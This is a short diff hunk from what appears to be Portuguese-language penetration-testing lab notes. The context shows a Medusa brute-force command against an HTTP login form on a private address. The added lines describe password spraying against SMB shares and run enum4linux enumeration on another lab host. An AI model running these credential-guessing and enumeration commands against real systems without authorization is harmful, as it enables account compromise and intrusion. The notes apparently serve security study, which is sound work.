@@ -28,3 +28,6 @@ medusa -h 192.168.0.105 -U users.txt -P pass.txt -M http \
 -m FORM:'username=^USER^&password=^PASS^&Login=Login' \
 -m 'FAIL=Login failed' -t 6
 
+# Ataque a servidores SMB (compartilhamento do windows e linux) neste Ataque será uma senha para vários usuários
+# usando o Password Spray que pode descobrir senhas fracas
+enum4linux -a 192.168.56.102
